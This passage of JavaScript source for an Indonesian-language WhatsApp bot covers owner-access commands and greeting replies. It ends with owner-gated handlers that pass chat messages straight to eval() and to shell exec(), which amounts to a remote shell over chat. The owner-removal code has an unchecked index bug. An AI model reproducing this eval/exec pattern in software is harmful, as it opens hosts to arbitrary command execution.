🚀 : ${latensi.toFixed(4)} _Second_
🗳️ : ${os.hostname()}
💻 : ${os.platform()}
🗓️ : ${tanggal} M`
                let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
                await kreyuk.sendButtonText(kr.chat, buttons, lowq, global.author, kr, {quoted: kr})
            	}
            break
// ADD/DEL AKSES //
case 'delakses':
case 'del':
    if (!isGroup) return kr.reply(`wajib dalam grup`)
if (!itsMeap) return kr.reply(`sorry anda sepertinya bukan pemilik bot`)
        
if (!args[0]) return kr.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
kr.reply(`Nomor ${ya} Sudah Di Hapus`)
break
case 'addakses':
case 'add':
 if (!isGroup) return kr.reply(`wajib dalam grup`)
if (!itsMeap) return kr.reply(`sorry anda sepertinya bukan pemilik bot`)
        
if (!args[0]) return kr.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await kreyuk.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
kr.reply(`Nomor ${bnnd} Sudah Di tambahkan!!!`)
break
case 'p':{
return kr.reply('Apa....Minimal Salam Lah😑')
}
break
default:
if ((budy) && ["assalamu'alaikum", "Assalamu'alaikum", "Assalamualaikum", "assalamualaikum", "Assalammualaikum", "assalammualaikum", "Asalamualaikum", "asalamualaikum", "Asalamu'alaikum", " asalamu'alaikum"].includes(budy) && !isCmd) {
kreyuk.sendMessage(from, { text: `${pickRandom(["Wa'alaikumussalam","Wa'alaikumussalam Wb.","Wa'alaikumussalam Wr. Wb.","Wa'alaikumussalam Warahmatullahi Wabarakatuh"])}`})
}
}
if (budy.startsWith('=>')) {
if (!itsMeap) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return kr.reply(bang)
}
try {
kr.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
kr.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMeap) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await kr.reply(evaled)
} catch (err) {
kr.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMeap) return
try {
return kr.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMeap) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return kr.reply(`${err}`)
if (stdout) {
kr.reply(stdout)
}
})
}
} catch (err) {
kr.reply(util.format(err))
}
} 